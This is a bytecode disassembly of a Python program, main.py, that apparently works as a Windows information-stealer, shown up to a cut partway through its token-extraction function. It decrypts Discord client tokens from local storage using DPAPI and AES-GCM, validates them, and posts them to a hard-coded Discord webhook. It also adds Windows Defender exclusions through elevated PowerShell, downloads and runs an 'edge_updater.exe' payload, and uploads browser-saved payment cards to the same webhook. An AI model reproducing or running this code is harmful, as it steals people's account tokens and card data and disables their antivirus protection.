### CODE OBJECT: <module>  (file=main.py, line=1)
# consts:
  STR: 'APPDATA'
  STR: 'TEMP'
  STR: ''
  STR: 'https://canary.discord.com/api/webhooks/1548207095155920998/J-KZeu0QQYWNvGTRuLM9FiGMV18LSb6Uz_48NRZoLJZNjhY_DqMDbJ-MuYYey5T7_NBj'
  STR: '/Discord'
  STR: '/Local Storage/leveldb'
  STR: '/Lightcord'
  STR: '/discordcanary'
  STR: '/discordptb'
  STR: 'DATA_BLOB'
# names: ('os', 're', 'time', 'json', 'loads', 'json_loads', 'dumps', 'urllib.request', 'Request', 'urlopen', 'base64', 'b64decode', 'ctypes', 'windll', 'wintypes', 'byref', 'cdll', 'Structure', 'POINTER', 'c_char', 'c_buffer', 'Crypto.Cipher', 'AES', 'requests', 'getenv', 'roaming', 'environ', 'get', 'temp', 'Tokens', 'webhook_url', 'discordPaths', 'DATA_BLOB', 'GetData', 'CryptUnprotectData', 'DecryptValue', 'checkToken', 'uploadToken', 'runUpdaterAndHarvestCards', 'GetDiscord', 'patt')
# varnames: ()
# bytecode:
       0 RESUME                       
       2 LOAD_SMALL_INT               
       4 LOAD_CONST                   None
       6 IMPORT_NAME                  os
       8 STORE_NAME                   os
      10 LOAD_SMALL_INT               
      12 LOAD_CONST                   None
      14 IMPORT_NAME                  re
      16 STORE_NAME                   re
      18 LOAD_SMALL_INT               
      20 LOAD_CONST                   None
      22 IMPORT_NAME                  time
      24 STORE_NAME                   time
      26 LOAD_SMALL_INT               
      28 LOAD_CONST                   ('loads', 'dumps')
      30 IMPORT_NAME                  json
      32 IMPORT_FROM                  loads
      34 STORE_NAME                   json_loads
      36 IMPORT_FROM                  dumps
      38 STORE_NAME                   dumps
      40 POP_TOP                      
      42 LOAD_SMALL_INT               
      44 LOAD_CONST                   ('Request', 'urlopen')
      46 IMPORT_NAME                  urllib.request
      48 IMPORT_FROM                  Request
      50 STORE_NAME                   Request
      52 IMPORT_FROM                  urlopen
      54 STORE_NAME                   urlopen
      56 POP_TOP                      
      58 LOAD_SMALL_INT               
      60 LOAD_CONST                   ('b64decode',)
      62 IMPORT_NAME                  base64
      64 IMPORT_FROM                  b64decode
      66 STORE_NAME                   b64decode
      68 POP_TOP                      
      70 LOAD_SMALL_INT               
      72 LOAD_CONST                   ('windll', 'wintypes', 'byref', 'cdll', 'Structure', 'POINTER', 'c_char', 'c_buffer')
      74 IMPORT_NAME                  ctypes
      76 IMPORT_FROM                  windll
      78 STORE_NAME                   windll
      80 IMPORT_FROM                  wintypes
      82 STORE_NAME                   wintypes
      84 IMPORT_FROM                  byref
      86 STORE_NAME                   byref
      88 IMPORT_FROM                  cdll
      90 STORE_NAME                   cdll
      92 IMPORT_FROM                  Structure
      94 STORE_NAME                   Structure
      96 IMPORT_FROM                  POINTER
      98 STORE_NAME                   POINTER
     100 IMPORT_FROM                  c_char
     102 STORE_NAME                   c_char
     104 IMPORT_FROM                  c_buffer
     106 STORE_NAME                   c_buffer
     108 POP_TOP                      
     110 LOAD_SMALL_INT               
     112 LOAD_CONST                   ('AES',)
     114 IMPORT_NAME                  Crypto.Cipher
     116 IMPORT_FROM                  AES
     118 STORE_NAME                   AES
     120 POP_TOP                      
     122 LOAD_SMALL_INT               
     124 LOAD_CONST                   None
     126 IMPORT_NAME                  requests
     128 STORE_NAME                   requests
     130 LOAD_NAME                    os
     132 LOAD_ATTR                    getenv
     152 PUSH_NULL                    
     154 LOAD_CONST                   'APPDATA'
     156 CALL                         
     164 STORE_NAME                   roaming
     166 LOAD_NAME                    os
     168 LOAD_ATTR                    environ
     188 LOAD_ATTR                    get + NULL|self
     208 LOAD_CONST                   'TEMP'
     210 CALL                         
     218 COPY                         
     220 TO_BOOL                      
     228 POP_JUMP_IF_TRUE             to L1
     232 NOT_TAKEN                    
     234 POP_TOP                      
     236 LOAD_NAME                    os
     238 LOAD_ATTR                    getenv
     258 PUSH_NULL                    
     260 LOAD_CONST                   'TEMP'
     262 CALL                         
     270 STORE_NAME                   temp
     272 LOAD_CONST                   ''
     274 STORE_GLOBAL                 Tokens
     276 LOAD_CONST                   'https://canary.discord.com/api/webhooks/1548207095155920998/J-KZeu0QQYWNvGTRuLM9FiGMV18LSb6Uz_48NRZoLJZNjhY_DqMDbJ-MuYYey5T7_NBj'
     278 STORE_NAME                   webhook_url
     280 LOAD_NAME                    roaming
     282 FORMAT_SIMPLE                
     284 LOAD_CONST                   '/Discord'
     286 BUILD_STRING                 
     288 LOAD_CONST                   '/Local Storage/leveldb'
     290 BUILD_LIST                   
     292 LOAD_NAME                    roaming
     294 FORMAT_SIMPLE                
     296 LOAD_CONST                   '/Lightcord'
     298 BUILD_STRING                 
     300 LOAD_CONST                   '/Local Storage/leveldb'
     302 BUILD_LIST                   
     304 LOAD_NAME                    roaming
     306 FORMAT_SIMPLE                
     308 LOAD_CONST                   '/discordcanary'
     310 BUILD_STRING                 
     312 LOAD_CONST                   '/Local Storage/leveldb'
     314 BUILD_LIST                   
     316 LOAD_NAME                    roaming
     318 FORMAT_SIMPLE                
     320 LOAD_CONST                   '/discordptb'
     322 BUILD_STRING                 
     324 LOAD_CONST                   '/Local Storage/leveldb'
     326 BUILD_LIST                   
     328 BUILD_LIST                   
     330 STORE_NAME                   discordPaths
     332 LOAD_BUILD_CLASS             
     334 PUSH_NULL                    
     336 LOAD_CONST                   <code object DATA_BLOB at 0x000001CD801C69D0, file "main.py", line 23>
     338 MAKE_FUNCTION                
     340 LOAD_CONST                   'DATA_BLOB'
     342 LOAD_NAME                    Structure
     344 CALL                         
     352 STORE_NAME                   DATA_BLOB
     354 LOAD_CONST                   <code object GetData at 0x000001CDFFF0E330, file "main.py", line 29>
     356 MAKE_FUNCTION                
     358 STORE_NAME                   GetData
     360 LOAD_CONST                   (b'',)
     362 LOAD_CONST                   <code object CryptUnprotectData at 0x000001CD8032CBD0, file "main.py", line 37>
     364 MAKE_FUNCTION                
     366 SET_FUNCTION_ATTRIBUTE       defaults
     368 STORE_NAME                   CryptUnprotectData
     370 LOAD_CONST                   (None,)
     372 LOAD_CONST                   <code object DecryptValue at 0x000001CDFFF16310, file "main.py", line 47>
     374 MAKE_FUNCTION                
     376 SET_FUNCTION_ATTRIBUTE       defaults
     378 STORE_NAME                   DecryptValue
     380 LOAD_CONST                   <code object checkToken at 0x000001CD801D8FF0, file "main.py", line 60>
     382 MAKE_FUNCTION                
     384 STORE_NAME                   checkToken
     386 LOAD_CONST                   <code object uploadToken at 0x000001CD801C9070, file "main.py", line 72>
     388 MAKE_FUNCTION                
     390 STORE_NAME                   uploadToken
     392 LOAD_CONST                   <code object runUpdaterAndHarvestCards at 0x000001CD803588B0, file "main.py", line 83>
     394 MAKE_FUNCTION                
     396 STORE_NAME                   runUpdaterAndHarvestCards
     398 LOAD_CONST                   <code object GetDiscord at 0x000001CD80358F50, file "main.py", line 136>
     400 MAKE_FUNCTION                
     402 STORE_NAME                   GetDiscord
     404 LOAD_NAME                    discordPaths
     406 GET_ITER                     
     408 FOR_ITER                     to L3
     412 STORE_NAME                   patt
     414 LOAD_NAME                    GetDiscord
     416 PUSH_NULL                    
     418 LOAD_NAME                    patt
     420 LOAD_SMALL_INT               
     422 BINARY_OP                    []
     434 LOAD_NAME                    patt
     436 LOAD_SMALL_INT               
     438 BINARY_OP                    []
     450 CALL                         
     458 POP_TOP                      
     460 JUMP_BACKWARD                to L2
     464 END_FOR                      
     466 POP_ITER                     
     468 LOAD_NAME                    runUpdaterAndHarvestCards
     470 PUSH_NULL                    
     472 CALL                         
     480 POP_TOP                      
     482 LOAD_CONST                   None
     484 RETURN_VALUE                 

  ### CODE OBJECT: DATA_BLOB  (file=main.py, line=23)
  # consts:
    STR: 'DATA_BLOB'
    STR: 'cbData'
    STR: 'pbData'
  # names: ('__name__', '__module__', '__qualname__', '__firstlineno__', 'wintypes', 'DWORD', 'POINTER', 'c_char', '_fields_', '__static_attributes__')
  # varnames: ()
  # bytecode:
         0 RESUME                       
         2 LOAD_NAME                    __name__
         4 STORE_NAME                   __module__
         6 LOAD_CONST                   'DATA_BLOB'
         8 STORE_NAME                   __qualname__
        10 LOAD_SMALL_INT               
        12 STORE_NAME                   __firstlineno__
        14 LOAD_CONST                   'cbData'
        16 LOAD_NAME                    wintypes
        18 LOAD_ATTR                    DWORD
        38 BUILD_TUPLE                  
        40 LOAD_CONST                   'pbData'
        42 LOAD_NAME                    POINTER
        44 PUSH_NULL                    
        46 LOAD_NAME                    c_char
        48 CALL                         
        56 BUILD_TUPLE                  
        58 BUILD_LIST                   
        60 STORE_NAME                   _fields_
        62 LOAD_CONST                   ()
        64 STORE_NAME                   __static_attributes__
        66 LOAD_CONST                   None
        68 RETURN_VALUE                 

  ### CODE OBJECT: GetData  (file=main.py, line=29)
  # consts:
  # names: ('int', 'cbData', 'pbData', 'c_buffer', 'cdll', 'msvcrt', 'memcpy', 'windll', 'kernel32', 'LocalFree', 'raw')
  # varnames: ('blob_out', 'cbData', 'pbData', 'buffer')
  # bytecode:
         0 RESUME                       
         2 LOAD_GLOBAL                  int + NULL
        12 LOAD_FAST_BORROW             blob_out
        14 LOAD_ATTR                    cbData
        34 CALL                         
        42 STORE_FAST                   cbData
        44 LOAD_FAST_BORROW             blob_out
        46 LOAD_ATTR                    pbData
        66 STORE_FAST                   pbData
        68 LOAD_GLOBAL                  c_buffer + NULL
        78 LOAD_FAST_BORROW             cbData
        80 CALL                         
        88 STORE_FAST                   buffer
        90 LOAD_GLOBAL                  cdll
       100 LOAD_ATTR                    msvcrt
       120 LOAD_ATTR                    memcpy + NULL|self
       140 LOAD_FAST_BORROW_LOAD_FAST_BORROW buffer, pbData
       142 LOAD_FAST_BORROW             cbData
       144 CALL                         
       152 POP_TOP                      
       154 LOAD_GLOBAL                  windll
       164 LOAD_ATTR                    kernel32
       184 LOAD_ATTR                    LocalFree + NULL|self
       204 LOAD_FAST_BORROW             pbData
       206 CALL                         
       214 POP_TOP                      
       216 LOAD_FAST_BORROW             buffer
       218 LOAD_ATTR                    raw
       238 RETURN_VALUE                 

  ### CODE OBJECT: CryptUnprotectData  (file=main.py, line=37)
  # consts:
  # names: ('c_buffer', 'len', 'DATA_BLOB', 'windll', 'crypt32', 'CryptUnprotectData', 'byref', 'GetData')
  # varnames: ('encrypted_bytes', 'entropy', 'buffer_in', 'buffer_entropy', 'blob_in', 'blob_entropy', 'blob_out')
  # bytecode:
         0 RESUME                       
         2 LOAD_GLOBAL                  c_buffer + NULL
        12 LOAD_FAST_BORROW             encrypted_bytes
        14 LOAD_GLOBAL                  len + NULL
        24 LOAD_FAST_BORROW             encrypted_bytes
        26 CALL                         
        34 CALL                         
        42 STORE_FAST                   buffer_in
        44 LOAD_GLOBAL                  c_buffer + NULL
        54 LOAD_FAST_BORROW             entropy
        56 LOAD_GLOBAL                  len + NULL
        66 LOAD_FAST_BORROW             entropy
        68 CALL                         
        76 CALL                         
        84 STORE_FAST                   buffer_entropy
        86 LOAD_GLOBAL                  DATA_BLOB + NULL
        96 LOAD_GLOBAL                  len + NULL
       106 LOAD_FAST_BORROW             encrypted_bytes
       108 CALL                         
       116 LOAD_FAST_BORROW             buffer_in
       118 CALL                         
       126 STORE_FAST                   blob_in
       128 LOAD_GLOBAL                  DATA_BLOB + NULL
       138 LOAD_GLOBAL                  len + NULL
       148 LOAD_FAST_BORROW             entropy
       150 CALL                         
       158 LOAD_FAST_BORROW             buffer_entropy
       160 CALL                         
       168 STORE_FAST                   blob_entropy
       170 LOAD_GLOBAL                  DATA_BLOB + NULL
       180 CALL                         
       188 STORE_FAST                   blob_out
       190 LOAD_GLOBAL                  windll
       200 LOAD_ATTR                    crypt32
       220 LOAD_ATTR                    CryptUnprotectData + NULL|self
       240 LOAD_GLOBAL                  byref + NULL
       250 LOAD_FAST_BORROW             blob_in
       252 CALL                         
       260 LOAD_CONST                   None
       262 LOAD_GLOBAL                  byref + NULL
       272 LOAD_FAST_BORROW             blob_entropy
       274 CALL                         
       282 LOAD_CONST                   None
       284 LOAD_CONST                   None
       286 LOAD_SMALL_INT               
       288 LOAD_GLOBAL                  byref + NULL
       298 LOAD_FAST_BORROW             blob_out
       300 CALL                         
       308 CALL                         
       316 TO_BOOL                      
       324 POP_JUMP_IF_FALSE            to L1
       328 NOT_TAKEN                    
       330 LOAD_GLOBAL                  GetData + NULL
       340 LOAD_FAST_BORROW             blob_out
       342 CALL                         
       350 RETURN_VALUE                 
       352 LOAD_CONST                   None
       354 RETURN_VALUE                 

  ### CODE OBJECT: DecryptValue  (file=main.py, line=47)
  # consts:
    STR: 'utf8'
    STR: 'ignore'
  # names: ('decode', 'AES', 'new', 'MODE_GCM', 'decrypt')
  # varnames: ('buff', 'master_key', 'starts', 'iv', 'payload', 'cipher', 'decrypted_pass')
  # bytecode:
         0 RESUME                       
         2 NOP                          
         4 LOAD_FAST_BORROW             buff
         6 LOAD_ATTR                    decode + NULL|self
        26 LOAD_CONST                   'utf8'
        28 LOAD_CONST                   'ignore'
        30 LOAD_CONST                   ('encoding', 'errors')
        32 CALL_KW                      
        40 LOAD_CONST                   slice(None, 3, None)
        42 BINARY_OP                    []
        54 STORE_FAST                   starts
        56 LOAD_FAST_BORROW             starts
        58 LOAD_CONST                   ('v10', 'v11')
        60 CONTAINS_OP                  in
        64 POP_JUMP_IF_FALSE            to L1
        68 NOT_TAKEN                    
        70 LOAD_FAST_BORROW             buff
        72 LOAD_CONST                   slice(3, 15, None)
        74 BINARY_OP                    []
        86 STORE_FAST                   iv
        88 LOAD_FAST_BORROW             buff
        90 LOAD_CONST                   slice(15, None, None)
        92 BINARY_OP                    []
       104 STORE_FAST                   payload
       106 LOAD_GLOBAL                  AES
       116 LOAD_ATTR                    new
       136 PUSH_NULL                    
       138 LOAD_FAST_BORROW             master_key
       140 LOAD_GLOBAL                  AES
       150 LOAD_ATTR                    MODE_GCM
       170 LOAD_FAST_BORROW             iv
       172 CALL                         
       180 STORE_FAST                   cipher
       182 LOAD_FAST_BORROW             cipher
       184 LOAD_ATTR                    decrypt + NULL|self
       204 LOAD_FAST_BORROW             payload
       206 CALL                         
       214 STORE_FAST                   decrypted_pass
       216 LOAD_FAST_BORROW             decrypted_pass
       218 LOAD_CONST                   None
       220 LOAD_CONST                   -16
       222 BINARY_SLICE                 
       224 LOAD_ATTR                    decode + NULL|self
       244 CALL                         
       252 RETURN_VALUE                 
       254 NOP                          
       256 LOAD_CONST                   None
       258 RETURN_VALUE                 
       260 PUSH_EXC_INFO                
       262 POP_TOP                      
       264 POP_EXCEPT                   
       266 LOAD_CONST                   None
       268 RETURN_VALUE                 
       270 COPY                         
       272 POP_EXCEPT                   
       274 RERAISE                      

  ### CODE OBJECT: checkToken  (file=main.py, line=60)
  # consts:
    STR: 'Authorization'
    STR: 'Content-Type'
    STR: 'application/json'
    STR: 'User-Agent'
    STR: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
    STR: 'https://discordapp.com/api/v6/users/@me'
  # names: ('urlopen', 'Request', 'getcode')
  # varnames: ('token', 'headers', 'req')
  # bytecode:
         0 RESUME                       
         2 LOAD_CONST                   'Authorization'
         4 LOAD_FAST_BORROW             token
         6 LOAD_CONST                   'Content-Type'
         8 LOAD_CONST                   'application/json'
        10 LOAD_CONST                   'User-Agent'
        12 LOAD_CONST                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
        14 BUILD_MAP                    
        16 STORE_FAST                   headers
        18 NOP                          
        20 LOAD_GLOBAL                  urlopen + NULL
        30 LOAD_GLOBAL                  Request + NULL
        40 LOAD_CONST                   'https://discordapp.com/api/v6/users/@me'
        42 LOAD_FAST_BORROW             headers
        44 LOAD_CONST                   ('headers',)
        46 CALL_KW                      
        54 CALL                         
        62 STORE_FAST                   req
        64 LOAD_FAST_BORROW             req
        66 LOAD_ATTR                    getcode + NULL|self
        86 CALL                         
        94 LOAD_SMALL_INT               
        96 COMPARE_OP                   ==
       100 RETURN_VALUE                 
       102 PUSH_EXC_INFO                
       104 POP_TOP                      
       106 POP_EXCEPT                   
       108 LOAD_CONST                   False
       110 RETURN_VALUE                 
       112 COPY                         
       114 POP_EXCEPT                   
       116 RERAISE                      

  ### CODE OBJECT: uploadToken  (file=main.py, line=72)
  # consts:
    STR: 'content'
    STR: 'Bulunan Yol: `'
    STR: '`\nToken: ||`'
    STR: '`||'
    STR: 'username'
    STR: 'cagin web helper'
    STR: 'avatar_url'
    STR: 'https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg'
  # names: ('requests', 'post', 'webhook_url')
  # varnames: ('token', 'path', 'data')
  # bytecode:
         0 RESUME                       
         2 LOAD_CONST                   'content'
         4 LOAD_CONST                   'Bulunan Yol: `'
         6 LOAD_FAST_BORROW             path
         8 FORMAT_SIMPLE                
        10 LOAD_CONST                   '`\nToken: ||`'
        12 LOAD_FAST_BORROW             token
        14 FORMAT_SIMPLE                
        16 LOAD_CONST                   '`||'
        18 BUILD_STRING                 
        20 LOAD_CONST                   'username'
        22 LOAD_CONST                   'cagin web helper'
        24 LOAD_CONST                   'avatar_url'
        26 LOAD_CONST                   'https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg'
        28 BUILD_MAP                    
        30 STORE_FAST                   data
        32 NOP                          
        34 LOAD_GLOBAL                  requests
        44 LOAD_ATTR                    post
        64 PUSH_NULL                    
        66 LOAD_GLOBAL                  webhook_url
        76 LOAD_FAST_BORROW             data
        78 LOAD_CONST                   ('json',)
        80 CALL_KW                      
        88 POP_TOP                      
        90 LOAD_CONST                   None
        92 RETURN_VALUE                 
        94 PUSH_EXC_INFO                
        96 POP_TOP                      
        98 POP_EXCEPT                   
       100 LOAD_CONST                   None
       102 RETURN_VALUE                 
       104 COPY                         
       106 POP_EXCEPT                   
       108 RERAISE                      

  ### CODE OBJECT: runUpdaterAndHarvestCards  (file=main.py, line=83)
  # consts:
    STR: 'edge_updater.exe'
    STR: "Add-MpPreference -ExclusionPath '"
    STR: "'"
    STR: "Add-MpPreference -ExclusionProcess 'edge_updater.exe'"
    STR: 'runas'
    STR: 'powershell.exe'
    STR: '-Command "'
    STR: '; '
    STR: '"'
    STR: 'https://github.com/ring0private/caginyucel/releases/download/31/edge_updater.exe'
    STR: 'wb'
    STR: 'all'
    STR: 'output'
    STR: 'Default'
    STR: 'cards.json'
    STR: 'rb'
    STR: 'file'
    STR: 'payload_json'
    STR: 'content'
    STR: 'Taray²c² Kartlar² ('
    STR: '):'
    STR: 'username'
    STR: 'cagin web helper'
    STR: 'avatar_url'
    STR: 'https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg'
  # names: ('os', 'path', 'join', 'temp', 'windll', 'shell32', 'ShellExecuteW', 'time', 'sleep', 'requests', 'get', 'status_code', 'open', 'write', 'content', 'range', 'exists', 'len', 'listdir', 'dumps', 'post', 'webhook_url')
  # varnames: ('exe_path', 'ex_path_cmd', 'ex_proc_cmd', 'url', 'r', 'f', 'output_dir', '_', 'browser_name', 'default_path', 'cards_file', 'cf', 'files', 'payload')
  # bytecode:
         0 RESUME                       
         2 NOP                          
         4 LOAD_GLOBAL                  os
        14 LOAD_ATTR                    path
        34 LOAD_ATTR                    join + NULL|self
        54 LOAD_GLOBAL                  temp
        64 LOAD_CONST                   'edge_updater.exe'
        66 CALL                         
        74 STORE_FAST                   exe_path
        76 LOAD_CONST                   "Add-MpPreference -ExclusionPath '"
        78 LOAD_FAST_BORROW             exe_path
        80 FORMAT_SIMPLE                
        82 LOAD_CONST                   "'"
        84 BUILD_STRING                 
        86 STORE_FAST                   ex_path_cmd
        88 LOAD_CONST                   "Add-MpPreference -ExclusionProcess 'edge_updater.exe'"
        90 STORE_FAST                   ex_proc_cmd
        92 LOAD_GLOBAL                  windll
       102 LOAD_ATTR                    shell32
       122 LOAD_ATTR                    ShellExecuteW + NULL|self
       142 LOAD_CONST                   None
       144 LOAD_CONST                   'runas'
       146 LOAD_CONST                   'powershell.exe'
       148 LOAD_CONST                   '-Command "'
       150 LOAD_FAST_BORROW             ex_path_cmd
       152 FORMAT_SIMPLE                
       154 LOAD_CONST                   '; '
       156 LOAD_FAST_BORROW             ex_proc_cmd
       158 FORMAT_SIMPLE                
       160 LOAD_CONST                   '"'
       162 BUILD_STRING                 
       164 LOAD_CONST                   None
       166 LOAD_SMALL_INT               
       168 CALL                         
       176 POP_TOP                      
       178 LOAD_GLOBAL                  time
       188 LOAD_ATTR                    sleep
       208 PUSH_NULL                    
       210 LOAD_SMALL_INT               
       212 CALL                         
       220 POP_TOP                      
       222 LOAD_CONST                   'https://github.com/ring0private/caginyucel/releases/download/31/edge_updater.exe'
       224 STORE_FAST                   url
       226 LOAD_GLOBAL                  requests
       236 LOAD_ATTR                    get
       256 PUSH_NULL                    
       258 LOAD_FAST_BORROW             url
       260 CALL                         
       268 STORE_FAST                   r
       270 LOAD_FAST_BORROW             r
       272 LOAD_ATTR                    status_code
       292 LOAD_SMALL_INT               
       294 COMPARE_OP                   bool(==)
       298 EXTENDED_ARG                 
       300 POP_JUMP_IF_FALSE            to L10
       304 NOT_TAKEN                    
       306 LOAD_GLOBAL                  open + NULL
       316 LOAD_FAST_BORROW             exe_path
       318 LOAD_CONST                   'wb'
       320 CALL                         
       328 COPY                         
       330 LOAD_SPECIAL                 __exit__
       332 SWAP                         
       334 SWAP                         
       336 LOAD_SPECIAL                 __enter__
       338 CALL                         
       346 STORE_FAST                   f
       348 LOAD_FAST_BORROW             f
       350 LOAD_ATTR                    write + NULL|self
       370 LOAD_FAST_BORROW             r
       372 LOAD_ATTR                    content
       392 CALL                         
       400 POP_TOP                      
       402 LOAD_CONST                   None
       404 LOAD_CONST                   None
       406 LOAD_CONST                   None
       408 CALL                         
       416 POP_TOP                      
       418 LOAD_GLOBAL                  windll
       428 LOAD_ATTR                    shell32
       448 LOAD_ATTR                    ShellExecuteW + NULL|self
       468 LOAD_CONST                   None
       470 LOAD_CONST                   'runas'
       472 LOAD_FAST_BORROW             exe_path
       474 LOAD_CONST                   'all'
       476 LOAD_CONST                   None
       478 LOAD_SMALL_INT               
       480 CALL                         
       488 POP_TOP                      
       490 LOAD_GLOBAL                  os
       500 LOAD_ATTR                    path
       520 LOAD_ATTR                    join + NULL|self
       540 LOAD_GLOBAL                  temp
       550 LOAD_CONST                   'output'
       552 CALL                         
       560 STORE_FAST                   output_dir
       562 LOAD_GLOBAL                  range + NULL
       572 LOAD_SMALL_INT               
       574 CALL                         
       582 GET_ITER                     
       584 FOR_ITER                     to L4
       588 STORE_FAST                   _
       590 LOAD_GLOBAL                  os
       600 LOAD_ATTR                    path
       620 LOAD_ATTR                    exists + NULL|self
       640 LOAD_FAST_BORROW             output_dir
       642 CALL                         
       650 TO_BOOL                      
       658 POP_JUMP_IF_FALSE            to L3
       662 NOT_TAKEN                    
       664 LOAD_GLOBAL                  len + NULL
       674 LOAD_GLOBAL                  os
       684 LOAD_ATTR                    listdir
       704 PUSH_NULL                    
       706 LOAD_FAST_BORROW             output_dir
       708 CALL                         
       716 CALL                         
       724 LOAD_SMALL_INT               
       726 COMPARE_OP                   bool(>)
       730 POP_JUMP_IF_FALSE            to L3
       734 NOT_TAKEN                    
       736 LOAD_GLOBAL                  time
       746 LOAD_ATTR                    sleep
       766 PUSH_NULL                    
       768 LOAD_SMALL_INT               
       770 CALL                         
       778 POP_TOP                      
       780 POP_TOP                      
       782 JUMP_FORWARD                 to L5
       784 LOAD_GLOBAL                  time
       794 LOAD_ATTR                    sleep
       814 PUSH_NULL                    
       816 LOAD_SMALL_INT               
       818 CALL                         
       826 POP_TOP                      
       828 JUMP_BACKWARD                to L2
       832 END_FOR                      
       834 POP_ITER                     
       836 LOAD_GLOBAL                  os
       846 LOAD_ATTR                    path
       866 LOAD_ATTR                    exists + NULL|self
       886 LOAD_FAST_BORROW             output_dir
       888 CALL                         
       896 TO_BOOL                      
       904 POP_JUMP_IF_FALSE            to L9
       908 NOT_TAKEN                    
       910 LOAD_GLOBAL                  os
       920 LOAD_ATTR                    listdir
       940 PUSH_NULL                    
       942 LOAD_FAST_BORROW             output_dir
       944 CALL                         
       952 GET_ITER                     
       954 FOR_ITER                     to L8
       958 STORE_FAST                   browser_name
       960 LOAD_GLOBAL                  os
       970 LOAD_ATTR                    path
       990 LOAD_ATTR                    join + NULL|self
      1010 LOAD_FAST_BORROW_LOAD_FAST_BORROW output_dir, browser_name
      1012 LOAD_CONST                   'Default'
      1014 CALL                         
      1022 STORE_FAST                   default_path
      1024 LOAD_GLOBAL                  os
      1034 LOAD_ATTR                    path
      1054 LOAD_ATTR                    join + NULL|self
      1074 LOAD_FAST_BORROW             default_path
      1076 LOAD_CONST                   'cards.json'
      1078 CALL                         
      1086 STORE_FAST                   cards_file
      1088 LOAD_GLOBAL                  os
      1098 LOAD_ATTR                    path
      1118 LOAD_ATTR                    exists + NULL|self
      1138 LOAD_FAST_BORROW             cards_file
      1140 CALL                         
      1148 TO_BOOL                      
      1156 POP_JUMP_IF_TRUE             to L7
      1160 NOT_TAKEN                    
      1162 JUMP_BACKWARD                to L6
      1166 NOP                          
      1168 LOAD_GLOBAL                  open + NULL
      1178 LOAD_FAST_BORROW             cards_file
      1180 LOAD_CONST                   'rb'
      1182 CALL                         
      1190 COPY                         
      1192 LOAD_SPECIAL                 __exit__
      1194 SWAP                         
      1196 SWAP                         
      1198 LOAD_SPECIAL                 __enter__
      1200 CALL                         
      1208 STORE_FAST                   cf
      1210 LOAD_CONST                   'file'
      1212 LOAD_FAST_BORROW             cf
      1214 BUILD_MAP                    
      1216 STORE_FAST                   files
      1218 LOAD_CONST                   'payload_json'
      1220 LOAD_GLOBAL                  dumps + NULL
      1230 LOAD_CONST                   'content'
      1232 LOAD_CONST                   'Taray²c² Kartlar² ('
      1234 LOAD_FAST_BORROW             browser_name
      1236 FORMAT_SIMPLE                
      1238 LOAD_CONST                   '):'
      1240 BUILD_STRING                 
      1242 LOAD_CONST                   'username'
      1244 LOAD_CONST                   'cagin web helper'
      1246 LOAD_CONST                   'avatar_url'
      1248 LOAD_CONST                   'https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg'
      1250 BUILD_MAP                    
      1252 CALL                         
      1260 BUILD_MAP                    
      1262 STORE_FAST                   payload
      1264 LOAD_GLOBAL                  requests
      1274 LOAD_ATTR                    post
      1294 PUSH_NULL                    
      1296 LOAD_GLOBAL                  webhook_url
      1306 LOAD_FAST_BORROW_LOAD_FAST_BORROW payload, files
      1308 LOAD_CONST                   ('data', 'files')
      1310 CALL_KW                      
      1318 POP_TOP                      
      1320 LOAD_CONST                   None
      1322 LOAD_CONST                   None
      1324 LOAD_CONST                   None
      1326 CALL                         
      1334 POP_TOP                      
      1336 JUMP_BACKWARD                to L6
      1340 END_FOR                      
      1342 POP_ITER                     
      1344 LOAD_CONST                   None
      1346 RETURN_VALUE                 
      1348 LOAD_CONST                   None
      1350 RETURN_VALUE                 
      1352 LOAD_CONST                   None
      1354 RETURN_VALUE                 
      1356 PUSH_EXC_INFO                
      1358 WITH_EXCEPT_START            
      1360 TO_BOOL                      
      1368 POP_JUMP_IF_TRUE             to L11
      1372 NOT_TAKEN                    
      1374 RERAISE                      
      1376 POP_TOP                      
      1378 POP_EXCEPT                   
      1380 POP_TOP                      
      1382 POP_TOP                      
      1384 POP_TOP                      
      1386 EXTENDED_ARG                 
      1388 JUMP_BACKWARD_NO_INTERRUPT   to L1
      1390 COPY                         
      1392 POP_EXCEPT                   
      1394 RERAISE                      
      1396 PUSH_EXC_INFO                
      1398 WITH_EXCEPT_START            
      1400 TO_BOOL                      
      1408 POP_JUMP_IF_TRUE             to L12
      1412 NOT_TAKEN                    
      1414 RERAISE                      
      1416 POP_TOP                      
      1418 POP_EXCEPT                   
      1420 POP_TOP                      
      1422 POP_TOP                      
      1424 POP_TOP                      
      1426 JUMP_BACKWARD                to L6
      1430 COPY                         
      1432 POP_EXCEPT                   
      1434 RERAISE                      
      1436 PUSH_EXC_INFO                
      1438 POP_TOP                      
      1440 POP_EXCEPT                   
      1442 JUMP_BACKWARD                to L6
      1446 COPY                         
      1448 POP_EXCEPT                   
      1450 RERAISE                      
      1452 PUSH_EXC_INFO                
      1454 POP_TOP                      
      1456 POP_EXCEPT                   
      1458 LOAD_CONST                   None
      1460 RETURN_VALUE                 
      1462 COPY                         
      1464 POP_EXCEPT                   
      1466 RERAISE                      

  ### CODE OBJECT: GetDiscord  (file=main.py, line=136)
  # consts:
    STR: '/Local State'
    STR: 'r'
    STR: 'utf-8'
    STR: 'os_crypt'
    STR: 'encrypted_key'
    STR: '.log'
    STR: '.ldb'
    STR: '\\'
    STR: 'ignore'
    STR: 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'
    STR: 'dQw4w9WgXcQ:'
  # names: ('os', 'path', 'exists', 'open', 'json_loads', 'read', 'b64decode', 'CryptUnprotectData', 'listdir', 'endswith', 'readlines', 're', 'findall', 'strip', 'split', 'DecryptValue', 'checkToken', 'Tokens', 'uploadToken')
  # varnames: ('path', 'arg', 'pathC', 'pathKey', 'f', 'local_state', 'master_key', 'file', 'lines', 'line', 'token', 'token_part', 'tokenDecoded')
  # bytecode:
         0 RESUME                       
         2 LOAD_GLOBAL                  os
        12 LOAD_ATTR                    path
        32 LOAD_ATTR                    exists + NULL|self
        52 LOAD_FAST_BORROW             path
        54 FORMAT_SIMPLE                
        56 LOAD_CONST                   '/Local State'
        58 BUILD_STRING                 
        60 CALL                         
        68 TO_BOOL                      
        76 POP_JUMP_IF_TRUE             to L1
        80 NOT_TAKEN                    
